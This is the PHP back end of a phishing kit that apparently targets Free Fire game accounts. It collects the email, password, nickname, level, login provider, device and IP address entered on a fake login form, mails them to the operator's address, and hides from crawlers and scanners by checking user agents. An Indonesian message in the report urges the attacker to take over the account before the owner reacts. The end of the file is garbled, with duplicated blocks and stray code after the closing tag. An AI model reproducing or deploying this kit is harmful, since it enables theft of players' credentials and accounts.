<?php
error_reporting(0);
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
if(isset($_POST['login']))
    $email = $_POST['email']; 
    $pass  = $_POST['password']; 
    $nick  = $_POST['nick'];
    $lvl   = $_POST['lvl'];
    $pas2  = $_POST['n'];
    $log   = $_POST['provider'];
    $dev   = $_POST['device'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    
$subject = "SETOR FF BOZZ $user";
$message = 
        $body = <<<EOD
            <html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><style>table, td, th {border: 2px solid green;text-align: center;}table{border-collapse: collapse;width: 100%;}th, td {padding: 8px;}tr:hover{background-color:#f5f5f5}</style></head>
            <body><table><tr><td>RESULT FF LOG $log</b></td></tr><tr><td>CEPET AMANIN BOSS, KEBURU DIGANTI SAMA YANG PUNYA!!!!</td></tr></table><br>
            <table><tr><th>Email</th><th>Password</th><th>Nickname</th><th>Level</th><th>EP Season</th><th>Device</th><th>IP Address</th></tr><tr><td>$email</td><td>$pass</td><td>$nick</td><td>$lvl</td><td>$pas2</td><td>$dev</td><td>$ip</td></tr></table><br></body></html>
EOD;

include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: •DocloAja• <Phising@Official.com>' . "\r\n";
$datamail = mail($DocloAja, $subject, $message, $headersx);


        $body = <<<EOD
            <html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><style>table, td, th {border: 2px solid green;text-align: center;}table{border-collapse: collapse;width: 100%;}th, td {padding: 8px;}tr:hover{background-color:#f5f5f5}</style></head>
            <body><table><tr><td>RESULT FF LOG $log</b></td></tr><tr><td>CEPET AMANIN BOSS, KEBURU DIGANTI SAMA YANG PUNYA!!!!</td></tr></table><br>
            <table><tr><th>Email</th><th>Password</th><th>Nickname</th><th>Level</th><th>EP Season</th><th>Device</th><th>IP Address</th></tr><tr><td>$email</td><td>$pass</td><td>$nick</td><td>$lvl</td><td>$pas2</td><td>$dev</td><td>$ip</td></tr></table><br></body></html>
EOD;

include 'idhmxd/js/dokumen.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: •DocloAja• <DocloAja@OFFICIAL.com>' . "\r\n";
$datamail = mail($DocloAja, $subject, $message, $headersx);
?>
            echo "<script>document.location='berhasil.php';</script>";
        }
    }
}
?>